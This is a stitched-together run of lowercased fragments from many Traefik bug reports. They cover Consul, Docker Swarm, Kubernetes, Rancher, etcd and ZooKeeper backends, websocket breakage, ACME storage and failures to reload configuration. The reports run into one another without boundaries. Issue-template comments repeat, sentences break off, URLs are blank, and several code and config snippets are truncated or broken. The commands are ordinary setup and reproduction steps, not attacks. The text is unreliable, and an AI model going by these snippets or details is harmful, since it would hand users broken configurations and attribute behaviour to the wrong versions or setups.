- operation cluster with consul, registrator, and traefik.
- registered containers with appropriate traefik labels: ```
stage.traefik.backend.loadbalancer.stickiness.cookiename=_pin
stage.traefik.backend.loadbalancer.stickiness=true
stage.traefik.frontend.priority=10
stage.traefik.frontend.rule=pathprefix:/api
stage.traefik.enable=true
``` - ran traefik with the following config: ```shell
./traefik \\ --debug=true \\ --configfile=config.toml \\ --consulcatalog \\ --consulcatalog.prefix=stage.traefik \\ --consulcatalog.debugloggeneratedtemplate \\ --consulcatalog.exposedbydefault=false \\ --consulcatalog.endpoint=127.0.0.1:8500
nothing, the server is just running with docker swarm (latest stable version) as backend
one of the backends in my traefik deployment is an ubuntu package mirror
traefik and the mirror are running in a docker swarm.
i am running traefik on top of docker swarm, some services are created using compose and cli others using the docker api (dockerpy).
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
configure traefik with http/https (acme) against an empty zookeeper cluster within kubernetes
remove `/traefik/acme/storagefile` key from zookeeper
start traefik with zookeeper backend
i've set a label: `traefik.frontend.rule=host:{containername}.{domain}`
my container is called `samplename`, my domain is `sampledomain`
we use [concourse]( (it's a ci/cd tool) under traefik
concourse ui uses `text/stream` to get information about builds from its backend
in traefik 1.3.8 everything works fine, but after updating to traefik 1.4.0 - 1.4.5 concourse can't get any event from its backend (infinite waiting...).
on updating a service in consul to use a different port, traefik does not reload the service so i get a bad gateway
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
run traefik with http redirected to https and examine access logs.
tried to access some endpoint through traefik, with https and certificate generation via let's encrypt.
i've posted about this before, but due to time limitations were unable to provide enough feedback so the bug got closed
just for fun i wanted to verify that the issue was gone in the latest traefik release (v1.5.0-rc2) and was surprised to see that it wasn't
simply put, traefik doesn't update when the underlying consul catalog changes
i tested this by adding two servers to the same consul service
these show up in traefik as they should
i then ran `consul leave` on one of the servers, before stopping the consul service
at this point the consul web ui showed that the stopped node was gone, while traefik continued to show both nodes
if i stop the web server (in addition to the stopped consul service) on the "down" node, traffic into traefik will naturally get about a 50% error rate
if i restart the traefik service, then the changes are picked up, and the single backend is reflected correctly
also if i re-add the "downed" server (and after verifying that it shows up in consul) the same happens - changes are not reflected in traefik until i restart the traefik service.
run traefik with zookeeper backend on kubernetes.
when i stop some backend application api (spring boot in my case)
traefik has some delay to detect the service shutdown, and i have some 502 bad gateway
for page 404 and 502, we cannot customize security headers
in last traefik version, we can only override headers when the backend service is ok
so i have this issue in my browser
no 'access-control-allow-origin' header is present on the requested resource
due to that, i cannot catch the 502 error in javascript, and i cannot properly catch the exception i have this issue with eureka as provider but i think this issue is commons to all provider
just more frequent with eureka because there a bigger delay before to detect backend shudown.
**ran `storeconfig` for the following toml against consul** this works fine, however a non-necessary `traefik/stage/acme/storagefile` entry is created with no value
docker run \\ -v $pwd/traefik-ssl-acme-seed.toml:/etc/traefik/traefik.toml \\ -e "consul_http_token=[consul-token]" \\ traefik \\ storeconfig -c /etc/traefik/traefik.toml \\ --consul \\ --consul.endpoint= \\ --consul.prefix="traefik/stage"
``` *traefik-ssl-acme-seed.toml*
loglevel="debug"
defaultentrypoints = ["http","https"] debug=true
insecureskipverify=true [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [web] address = ":8080" [web.statistics] [retry] # default: (number servers in backend) -1 [docker] domain="docker.localhost" swarmmode=true watch=true exposedbydefault=false [acme] email = "billy.letsencrypt-stage@my-test.com" onhostrule = true entrypoint = "https" storage = "traefik/stage/acme/acme.json" # the consul kv path where to store your certificates in the kv store acmelogging = true caserver = " " # staging!!
**launched traefik service pointing to this config** ```shell
docker service create \\
--name traefik-test \\
--mode replicated \\
--replicas 1 \\
--constraint=node.role==manager \\
--mount type=bind,source=/var/run/docker.sock,target=/var/run/docker.sock \\
--network my-net \\
--publish :80 \\
--publish :8080 \\
--publish :443 \\
-e "consul_http_token=[consul-acl-token]" \\
traefik:1.4.5 \\
--consul.endpoint= \\
--consul.prefix="traefik/stage"
``` traefik comes up, but fails to seed the`acme.json` key with the initial json database (the result of the initial acme registration/init) 3
**if i delete the empty `storagefile` key, and restart traefik service, acme.json is properly initialized.**
set up traefik to use the mesos backend
added a rancher environment to a fresh traefik container.
i'm testing out v1.5-rc2 with the changes from #2133 (great btw!), but traefik is throwing a go nil pointer during start up
my setup is using a docker backend for user-facing web content (which needs to be on https) and another consul backend for http or https traffic
the support from #2133 means i can now run the consul backend services on http whilst leaving the docker backend services on forced https.
checking new traefik version: 1.4.5
healthcheck cmd ["/traefik", "healthcheck", "--web"]
would like to use header like that:
- `access-control-allow-methods:post,get,options`
- `content-type: application/json; charset=utf-8`
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
using the new security annotation "ingress.kubernetes.io/hsts-max-age" for kubernetes in traefik1.5.0-rc1
i tried to serve nginx container's default html file through traefik
i created this `toml` file:
[entrypoints]
[entrypoints.http]
address = ":80" [web]
address = ":8080" [docker]
``` then started traefik: `docker run --network traefik -p 8080:8080 -p 80:80 -v $pwd/traefik.toml:/etc/traefik/traefik.toml -v /var/run/docker.sock:/var/run/docker.sock traefik` then started nginx: `docker run --network traefik -l "traefik.frontend.rule=host:localhost.dev" -l "traefik.docker.network=traefik" -l "traefik.backend=nginx" -l "traefik.port=80" -l "traefik.enable=true" nginx` then tried to access it with `curl --verbose --header \'host: localhost.dev\' `
container has the following labels:
{ "traefik.enable": "true", "traefik.frontend.headers.ssltemporaryredirect": "true", "traefik.frontend.headers.stsincludesubdomains": "false", "traefik.frontend.headers.stsseconds": "2592000", "traefik.frontend.headers.browserxssfilter": "true", "traefik.frontend.headers.contenttypenosniff": "true", "traefik.frontend.headers.customresponseheaders": "x-powered-by:allomancy,x-server:blackbox", "traefik.frontend.headers.referrerpolicy": "no-referrer", "traefik.port": "5050" }
start traefik v1.5rc1
send requests through traefik
check both `/health` endpoint and dashboard
i have a docker-compose file for my service: ```yaml
version: "2" services: dokuwiki: image: bitnami/dokuwiki:latest restart: always volumes: - /opt/dokuwiki:/bitnami networks: - web expose: - "80" labels: - "traefik.backend=dokuwiki" - "traefik.docker.network=web" - "traefik.frontend.rule=pathprefixstrip:/wiki" - "traefik.enable=true" - "traefik.port=80"
networks: web: external: true
``` i start with one instance (`docker-compose up -d`), traefik sees it, auto configures, and curl sees the wiki on mydomain.com/wiki/
with two instances (`docker-compose scale dokuwiki=2`), traefik handles the routing correctly as well
now if i execute `docker-compose scale dokuwiki=1` to scale down, traefik seems to still see my 2nd instance but without any ip
see logs below for details
curl now fails and reaches the main server (not the sub-path).
**the issue** - i have about 20 services that are online behind traefik
(they are blogs cms)
- when i redeploy those 20 services, one of them (sometimes 2 or 3) are not getting served by traefik.
- the service impacted is totally random
- in this case, the service is named **stupendous**.
- it the one that is not getting served by traefik.
- i use only one network.
used traefik with kuberenetes with lots of ingress rules for different host names
running `traefik` in kubernetes as an ingress controller
the hops to reach a pod are: 1
aws elb with ssl/tcp listeners (for ssl offloading) and proxy protocol enabled
traefik service nodeport (some high port)
traefik container (see arguments below) i'm also running a simple 'http echo' service in kubernetes that prints the headers of the requests it receives.
traefik 1.4.2 does not seem to gracefully reload changes to consul catalog tags (which again drives the frontend/backend configuration of traefik
this can be observed by: 1
configure a service with a setting such as circuit breaker:
```json "tags": [ "traefik.frontend.rule=host:stuff.stuff.com", "traefik.frontend.entrypoints=http", "traefik.enable=true", "traefik.backend.circuitbreaker=networkerrorratio() > 0.5" ]
``` if all is set up correctly, traefik should populate frontend/backend rules for the service
in order to see the issue, change a setting in the tags, for example to:
```json "tags": [ "traefik.frontend.rule=host:stuff.stuff.com", "traefik.frontend.entrypoints=http", "traefik.enable=true", "traefik.backend.circuitbreaker=responsecoderatio(500, 600, 0, 600) > 0.5" ]
``` on the node offering the service, issue a consul reload in order to pick up the changes.
if using the consul web ui, the ui should now show the updated tags
however, traefik still uses the config from the first tag array, and has not updated
when testing the same with traefik 1.3.8 it correctly updates itself, but on 1.4.2 it does not.
ran traefik on kubernetes as ingress controller
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
i tried to setup a list trusted ips in front of traefik which are allowed to forward the `x-forwarded-*` headers
the setup is a k8s ingress with an ip whitelist in the ingress
adding trusted ips as per the documentation does not seem to work, only marking it as insecure or whitelisting `0.0.0.0/0` in the ingress allows traffic in.
we deployed a new version of several containers that are used in the backends of traefik, which is using consul_catalog for discovery
traefik did not discover the change and update it's backends
we had to manually stop and re-deploy traefik to pick up the changes.
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
the configured backend responds to a `get` request with a server side redirect: `302 found` and a `location` header
traefik is configured to use compression
the client is a http2 client.
when two frontends are using the same backend, only the first processed frontend is able to set settings like basicauth or whitelistsourcerange
i would like to use multiple frontends to apply different behaviour based on the path of the uri
a simple test scenario:
two frontends with a different pathprefix but using the same backend **frontend website-a:**
- priority: 10
- backend: app
- rule: "pathprefix: /secure"
- basicauth: ["aaa:aaa"] **frontend website-b:**
- priority: 5
- backend: app
- rule: "pathprefix: /hello" **backend app:** - url: " " a short investigation in traefik\'s code reveals the following: server/server.go:
```go if backends[entrypointname+frontend.backend] == nil { ..
configure ip whitelist configure basic auth etc.
} else { log.debugf("reusing backend %s", frontend.backend) }
it seems frontend specific settings are skipped because the backend is already configured
when i duplicate the backend configuration to app2 and configure app2 as a backend on website-b the configuration works as expected.
i want to limit the number of cpus traefik uses to the number of physical cores
a usual way to do this in go is to set an environment variable `gomaxprocs`
i have a 4-core cpu with 8 threads, so i've set `gomaxprocs=4` in my `docker-compose.yml`.
i downloaded the [traefik_linux-amd64]( and built a docker image
afterwards, i created a docker service using the newly built docker image with traefik v1.4.0 on a docker swarm mode cluster running rhel atomic host v7.4.0 with docker engine v1.13.1.
i switched out the build container to use the regular debian golang container to let me
run the unit tests with -race
with current traefik (v1.4.0) in combination with rancher server (1.6.10) and nodes i'm having difficulties when the rancher server is down
we thought if the orchestration tool would go down it wouldn't affect the running containers behind traefik
however upon trying to get the configuration from rancher which results in an error (since it's down) traefik does reload his configuration with an empty configuration
is this intended or not? the piece of code for this can be found here (if i'm correct): #l95-l100 if we dig deeper into the method `listrancherenvironments` we see it correctly logs the error given but still continues with the other methods
if we take a look to another provider for example `etcd` we see: #l25-l27 which returns upon entering an error
was this for rancher the intended or not? considering the logic is not the same as other providers i think this is a bug.
i bumped traefik version from `1.3.3` to `roquefort`(docker images `traefik:roquefort db126a450043`) and i have some issue with **websocket over tls**
server is not behind any proxy, my backend has a self-signed certificate (but i e set the option `--insecureskipverify`) and websocket is handled by `gorilla` on backend and by native client on browsers
everything worked before, but not after bumping.
start traefik with racnher metadata
with enabling and disabling healtcheack.
run traefik with cli options only and changed `--web.path` to the custom value `/traefik`.
i updated from 1.3.x to 1.4.0
we use traefik as a gateway for some of our grpc services.
single calls, and streaming requests appear to work fine.streaming
responses are being buffered somewhere.
i've put together a small test case at:
added tag on service / app `traefik.backend.loadbalancer.stickiness=true`
deploy traefik to a kubernetes cluster, and set it up to handle ingress (everything good so far).
configure ingress for a service (still good, everything working).
add an `ingress.kubernetes.io/auth-realm` annotation to the ingress (see below).
start new consul/nomad cluster and start traefik.
upgraded traefik from ~1.2 to latest
then found that 1.3.3 was last working version
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
i tried to use new ecs backend feature - autodiscoverclusters.
so i added to my command line option `ecs.autodiscoverclusters=true` it generally works, but with one remark
i had one cluster without instances
until i removed it, ecs backend wasnt working at all, giving me this error ```shell
"time="2017-09-22t19:01:33z" level=error msg="provider connection error invalidparameterexception: container instance cannot be empty."
``` there wasn't even an ecs tab in traefik ui.
i believe this is a wrong behaviour, you should just skip empty clusters, not bring down whole backend.
the initial consul catalog was loaded successfully
subsequent changes to consul eg new service, updated service were not picked up by traefik.
running traefik in clustered mode with consul as the acme storage backend
ocasionally, we would see erratic behaviour that ended up with acme registration/certificate issuance failing and being retried for no apparent good reason
the issue ultimately bubbled up once we reached let's encrypt rate limts and were effetively dead in the water
start ec2 instance running traefik and consul client.
running 2+ backends (docker swarm 17.06) with the label `traefik.backend.loadbalancer.swarm=true`
update a docker swarm service (with scale >= 2) via the command `docker service update --image=xxx yyy`
docker system : rancher v1.6.5
deployed latest official image : `traefik:v1.4.0-rc2-alpine` with the following command for meta-data mode (formatted to be easier to read) ```
--web --rancher --rancher.domain=rancher.localhost --rancher.enableservicehealthfilter=false --rancher.exposedbydefault=false --rancher.metadata
``` along with the following container labels ```
io.rancher.container.agent.role=environment
io.rancher.container.create_agent=true
``` multiple stacks was then created, with different stack names
but **same container names** (web-studio in this case) each container is defined with the following traefik labels ```
traefik.enable=true
traefik.frontend.rule=host:the-container-unique-url.domain.something
traefik.port=80
``` note: this is a followup from
docker system : rancher v1.6.5
server : 3 x aws r4.8xlarge
traefik setup : 1 for each server number of node.js containers : ~300
number of domains per node.js container : 2
- 1 which is the default generated by service name
- 1 by a unique url, generated for the node.js web instances via 'traefik.alias.fqdn' we have a webservice which spins up node.js containers for each customer
we noticed that beyond approximately ~300 containers, the ~"301" container
does not show up on the admin panel, nor gets accessible
we have attempted to restart all traefik instances, loadbalancers, and even node.js server.
we confirmed healthcheck is valid on rancher
we replicated the issue, by removing instances, and adding them back.
instance 1-250+ is consistently working not sure if this issue is limited by rancher side, or traefik side note: 300 is not the exact number, but a close approximate.
executed `./traefik --configfile=configs/traefik_dev.toml --debug --consul --consul.endpoint="consul.***:8500"`
upgraded traefik from version 1.3.3 - raclette to 1.4.0-rc2, using rancher 1.4.3 as backend.
added option port with healthcheck according to this commit : <!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
upgrade traefik to 1.3.6 from 1.3.1 and watch websocket connection no longer working
our applications post request times out with 504 on the new version
1.3.1 works, returning successfully
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
had traefik successfully running in front of consul/nomad under v1.3.5.
whenever a nomad deploy updated the consul catalog, this was reflected in traefik
upgraded to v1.4.0-rc1 of traefik.
the initial consul catalog was loaded successfully.
subsequent changes to consul eg new service, updated service were not picked up by traefik.
config etcd frontends and backends, i will post my etcd screenshot in the end of post.
start traefik.
traefik started but failed to read my frontends sub child and backends sub child, so traefik can not foward my request to backend servers.
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
configure traefik frontends and backends data in zookeeper.
start my traefik with configure file.
traefik works according my configuration.
update backends-> backend_web -> servers -> server1 -> weight to new value.
traefik doesn't apply new changes.
restart traefik, traefik apply new changes.
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
follow the doc to create traefik ingress on kubernetes.
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
enabled access log to file with common format
tried to parse them with grok but got unusual characters when status and content size are not set
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
collabora code ( is an online office suite which can be integrated with nextcloud
in order to run nextcloud and collabora in docker containers, traefik is deployed on the host system and forwards all requests to a nginx backward proxy which in turn forwards requests either to nextcloud or collabora
for collabora web sockets to work correctly, some requests can't be modified in the slightes and require some url parts to remain encoded.
the [documentation]( suggests that go templates or sprig functions may be used for file configuration backends
i tried to define a configuration using go template in a toml file
`traefik.toml`
directory = "conf/"
``` `conf/sub.toml`
[backends] [backends.backend1] url = " " [backends.backend2] url = " " {{$frontends := dict "frontend1" "backend1" "frontend2" "backend2"}}
[frontends]
{{range $frontend, $backend := $frontends}} [frontends.{{$frontend}}] backend = "{{$backend}}"
i'm using traefik as a kubernetes ingress controller
i have configured https redirect as follows in the toml config file: ```toml
[entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] regex = "^ " replacement = " " [entrypoints.https] address = ":443" [entrypoints.https.tls]
``` i have also configured an ingress like this: ```yaml
apiversion: extensions/v1beta1
kind: ingress
metadata: name: test annotations: kubernetes.io/tls-acme: "true" kubernetes.io/ingress.class: "traefik" traefik.frontend.rule.type: "addprefix"
spec: tls: - hosts: - demo.example.com secretname: tls rules: - host: demo.example.com http: paths: - path: /path backend: servicename: myservice serviceport: 80
``` <!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
using the docker backend, my container for unifi worked perfectly up to traefik 1.3.3.
any higher version, i was getting a message about the websockets
the problem seems to be that the certificate is not ignored on the backend for wss:// links.
the normal page works perfectly with the "insecureskipverify" to true.
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
update from v1.2.3 to v1.3.0 of traefik
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
traefik updated from 1.3.5 to 1.3.6 (docker image)
my backend is now receiving the header `x-forwarded-port`.
but the value is not the port requested by the public client, but it the private port of the backend
client -> traefik (443) -> backend (8080)
i've cloned the latest master (1d2d0cefaa69d4265e07e0a49d903b2a8f819306) and found out that traefik is not loading the traefik configuration
from version 1.3 it returns {}
rancher version v1.6.5
left traefik running
i want to use `etcd` as configuration backend via the key/value store.
traefik seems to forward paths with multiple forward slashes (/) with http protocol prefix
this is particularly troublesome for go backends with `defaultservemux`, which will return a 301 of the request path
curl -v localhost//google.com
``` **sample go backend server**
package main import ( "fmt" "log" "net/http" "net/http/httputil"
) func main() { mux := http.newservemux() log.fatal(http.listenandserve(":3000", http.handlerfunc(func(w http.responsewriter, r *http.request) { requestdump, _ := httputil.dumprequest(r, true) log.println(string(requestdump)) mux.servehttp(w, r) })))
``` **start traefik** (see below for traefik.toml)
sudo ./traefik_linux-amd64 --configfile=./traefik.toml --web --loglevel=debug
``` <!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
#### setup * 5 node etcd2 cluster (aws m4.large instances with ssd 150/3000 iops)
* 5 node traefik proxy (aws m4.large instances) #### configuration traefik is configured to get all backend and frontend configs from etcd
i've recently updated from 1.3.2 to 1.3.5 and my (vaadin) web application which uses websocket (xhr) push went from working well to constantly reloading
when i change the push protocol to long polling (basically not using websockets at all) it works normally again
i've been able to reproduce this by going back and forth between 1.3.2 and 1.3.5 (currently latest) i'm aware this is a pretty thin explanation of this bug
so if any additional info is needed please ask!
since using acme, all the https certs are created in a file
routing websockets based on path `/f_mf`
request gets routed, but it is unable to handle it
since websockets are still sent on https.
the ws server works perfectly on http
`tshark -x ` on the bridge to the server (before nginx, client side) and in the [gotty container]( (backend)
posted to traefik, traefik proxied request to my backend which responded with a 201.
traefik then responded to my client with a 200
want to connect to websocket using http headers, similar to what is provided by haproxy : ```
frontend public bind *:80 ## routing based on websocket protocol header acl hdr_connection_upgrade hdr(connection) -i upgrade acl hdr_upgrade_websocket hdr(upgrade) -i websocket use_backend bk_ws if hdr_connection_upgrade hdr_upgrade_websocket default_backend bk_web
setup a simple file configuration for development purposes
doing this i mistyped one of the backend urls by chance so that there was a duplicated url.
connect to a websocket endpoint (socket.io)
`wss://mydomain.tld/socket.io/?transport=websocket`
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
i have been using the version 1.3.4 with kubernetes as an ingress controller and compression enabled.
the performance becomes very bad after 3 or 4 hours
i'm using traefik as a kubernetes ingress controller
most of my websites require https and the encryption perfectly works together with the letsencrypt certs
however, i have a couple of websites for which i cannot turn https on for various reasons and i would like to annotate some of my ingress rules so that traefik served only http
i've been trying a few variations of the following, but with no luck: ```yaml
kind: ingress
metadata: annotations: traefik.frontend.entrypoints: [\\"http\\"] traefik.frontend.entrypoints: [http] traefik.frontend.entrypoints: http # etc.
spec: rules: - host: website-with-no-https.com # ...
``` no matter what i do, the traefik dashboard keeps showing `http` + `https` badges next to the rule and the website gets served from ` `
if configuring entrypoints is not yet supported in the k8s environment, what do you guys think about adding it? if it's just a matter of a missing note [in the docs]( what annotation should be mentioned there?
i am creating a series of containers that have the same frontend.rule and would like the highest frontend.priority to dictate the route
sudo docker service create \\ --name hello-world-a \\ --network mynetwork \\ --publish :80 \\ --label traefik.protocol=http \\ --label traefik.port=80 \\ --label traefik.frontend.rule="host:helloworld.com" \\ --label traefik.frontend.priority=1707180001 \\ --label traefik.docker.network=mynetwork \\ localhost:5000/hello-world-nginx:170718a sudo docker service create \\ --name hello-world-b \\ --network mynetwork \\ --publish :80 \\ --label traefik.protocol=http \\ --label traefik.port=80 \\ --label traefik.frontend.rule="host:helloworld.com" \\ --label traefik.frontend.priority=1707180002 \\ --label traefik.docker.network=mynetwork \\ localhost:5000/hello-world-nginx:170718b
``` when created simultaneously, traefik routes to `hello-world-b` properly
sudo docker service create \\ --name hello-world-c \\ --network mynetwork \\ --publish :80 \\ --label traefik.protocol=http \\ --label traefik.port=80 \\ --label traefik.frontend.rule="host:helloworld.com" \\ --label traefik.frontend.priority=1707180003 \\ --label traefik.docker.network=mynetwork \\ localhost:5000/hello-world-nginx:170718c
``` later, adding a service with the same `frontend.rule` and incremented `frontend.priority` it does not register (i.e
hello-world-b stays live)
`hello-world-c` will appear if `hello-world-a` and `hello-world-b` are removed
(also, a nice to have would be is to display all identical rules that are overridden via the ui/api
) <!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
configured multiple entrypoints, and using a single backend with a healthcheck
there are two servers in a backend (config see below)
i "broke" the healthcheck on one of the servers
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
we expose [dashing.io]( behind traefik.
dashing.io uses [server-sent events](
if we let the default retry configuration (disabled), everything is working well.
if we enable the retry configuration (for example --retry.attempts=2), the event stream content type is replaced by traefik by text/plain and the browser throws an exception
**request example**
get /events http/1.1
connection: keep-alive
accept: text/event-stream
i first tried to get support on stackoverflow, but i think there's something else going on
post here for ref, but i'll restate below
i'm trying to get home-assistant in docker running behind traefik and i think i've had similar issues with other apps using websockets in the past (linuxserver/unifi controller and
the front page loads but when i try to login it just says connecting..
and keeps spinning
i open up the debugger in chrome and see this: `websocket connection to 'ws://home-assistant.docker.int.xxx.com/api/websocket' failed: websocket opening handshake timed out
` if i pass the port through directly to the host (i.e
it works
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
using traefik with the latest experimental build (containous/traefik:experimental) to test rancher-metadata integration.
tried to launch a swarm service with multiple traefik services <!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
i'm trying to make websocket handshake working with traefik and docker <!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
install the latest version of the official traeffik docker container in kubernetes
open /health to chech status code counts graph
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
create an ingress and a service object in kubernetes where the latter specifies an externalname and a service port/target port mapping.
our build process automatically deploys the latest build to our test environment
this is performed via `docker stack deploy`
the site's configuration is handled via docker labels
after the update, we are unable to access the site anymore
instead, we receive a "gateway timeout" error in the web browser
if we then stop the container, the swarm automatically restarts it and the site begins to work
we only just recently began experiencing this behavior, and it only happened after we updated to traefik 1.3.1 (from 1.2.3)
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
after upgrade from v1.2.3 to v1.3.2, traefik doesn't route the request to the service, and always return 404 not found.
i attempted to start traefik with the boltdb backend
./traefik_darwin-amd64 -d -c config.toml
#### config.toml ```toml
debug = true
defaultentrypoints = ["http"]
[entrypoints] [entrypoints.http] address = ":8081" [web]
address = ":8082" [boltdb]
endpoint = "/users/tochti/tmp/traefik.db"
watch = true
prefix = "/traefik"
applied #1707 to get access to secrets
installed deployment of latest traefik image with 3 replicas.
deployed k8s-dashboard and made ingress rule with basic auth + secret.
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
start traefik on kubernetes with rbac permissions set to allow access to ingresses, services, and endpoints
specifically, i did not permit access to secrets.
deploy traefik on kubernetes without basic authentication enabled through the `ingress.kubernetes.io/auth-type` annotation and rbac not permitting access to kubernetes secrets.
run the following docker compose file ```yml version: \'3\' services: traefik: image: traefik:1.3.1 command: --web --docker --docker.domain=docker.localhost --loglevel=debug networks: - web ports: - "80:80" - "8080:8080" volumes: - /var/run/docker.sock:/var/run/docker.sock - /dev/null:/traefik.toml whoami: image: emilevauge/whoami networks: - web labels: - "traefik.backend=whoami" - "traefik.app.frontend.rule=pathprefix:/whoami" - "traefik.healtcheck.frontend.rule=path:/whoami/healthcheck;replacepath:/foo" networks: web: driver: bridge
and navigate to ` ` in the browser.
here is the way to run portainer without traefik
it's all good
docker service create \\
--name "$ctn_portainer" \\
--network "ntw_front" --replicas "1" \\
--publish 9000:9000 \\
--constraint 'node.role == manager' \\
--mount type=bind,src=/var/run/docker.sock,dst=/var/run/docker.sock \\
--mount type=bind,src=/localpath/portainer/data,dst=/data \\
--reserve-memory "20m" --limit-memory "40m" \\
--restart-condition "any" --restart-max-attempts "55" \\
--update-delay "5s" --update-parallelism "1" \\
portainer/portainer:1.13.2 \\
-h unix:///var/run/docker.sock
``` when i run: ```
docker service create \\
--name "tool-portainer" \\
--network "ntw_front" --replicas "1" \\
--mount type=bind,src=/var/run/docker.sock,dst=/var/run/docker.sock \\
--mount type=bind,src=/mnt/deploygrp-133/config/portainer/data,dst=/data \\
--label "traefik.frontend.rule=host:nightshift.tk;pathprefixstrip:/tool-portainer" \\
--label "traefik.backend=tool-portainer" \\
--label "traefik.port=9000" \\
--label "traefik.docker.network=ntw_front" \\
--reserve-memory "20m" --limit-memory "40m" \\
--restart-condition "any" --restart-max-attempts "55" \\
--update-delay "5s" --update-parallelism "1" \\
portainer/portainer:1.13.2
i can see this (chrome on the top, firefox on the bottom): <img width="840" alt="screen shot 2017-06-16 at 10 43 43 pm" src=" "> when i click on validate, nothing!?!? in traefik dashboard it looks normal:
- `frontend-host-nightshift-tk-pathprefixstrip-tool-portainer`
- `backend-tool-portainer` but in the logs, `docker service logs -f proxy_traefik` there is no mention of `tool-portainer`
now i'm clueless!
setup a traefik instance that provides prometheus metrics.
* deploy a web app on k8s with multiple pods (3 app pods in our case) * app serves many endpoints on multiple paths (i.e
/path2, etc.)
* create an k8s service that selects the pods and requests stickiness through traefik.backend.loadbalancer.sticky: "true"
* deploy traefic ingress controller pods via a k8s deployment (3 traefik pods in our case) * configure traefik to watch a single namespace ("sets" in our case)
* create a k8s ingress resource with a single host * path: / * kubernetes.io/ingress.class: traefik
* start hitting endpoint from a single client via a web browser
upgrade traefik from 1.2 to 1.3, when i try to start the app it says that it contains invalid responses from marathon 1.4.2
and the marathon provider do not work.
configured a website using addprefix in the frontend rule, listening on both http and https entrypoints, with http entrypoint redirecting all requests to https entrypoint.
<!-- how to write a good issue? - respect the issue template as more as possible.
- if it's possible use the command `traefik bug`
see
- the title must be short and descriptive.
- explain the conditions which led you to write this issue: the context
--> i configured traefik to use let's encrypt and redirect all http trafic to https entrypoint
here's my traefik.toml file : ```toml
loglevel = "debug"
defaultentrypoints = ["http", "https"] [web]
address = ":8080"
readonly = true [web.auth.basic] users = ["{{ traefik_basic_auth_user }}:{{ traefik_basic_auth_password }}"] [docker]
endpoint = "unix:///var/run/docker.sock"
swarmmode = true
watch = true
domain = "{{ docker_url }}" [entrypoints] [entrypoints.http] address = ":80" [entrypoints.http.redirect] entrypoint = "https" [entrypoints.https] address = ":443" [entrypoints.https.tls] [acme]
email = "{{ acme_email }}"
storagefile = "/etc/traefik/acme/acme.json"
entrypoint = "https"
onhostrule = true
ondemand = true
i built a docker image on our base image using rhel 7.3 with the [traefik v1.3.0 gnu/linux amd64](
i took rancher down for maintenance.
i wanted to upload my `traefik.toml` to a consul
i have several backends and frontends configured under `[file]` section, and it all runs fine.
so i've added a `[consul]` section in the end of traefil toml and did `storeconfig`
i have a static wildcard web certificate (say it's `*.example.domain.com`) and since wildcards works only in `*.` scope i want to use acme module to generate crt for, say `subdomain.multi.example.domain.com` i have started traefik in docker swarm mode with following toml: ```toml
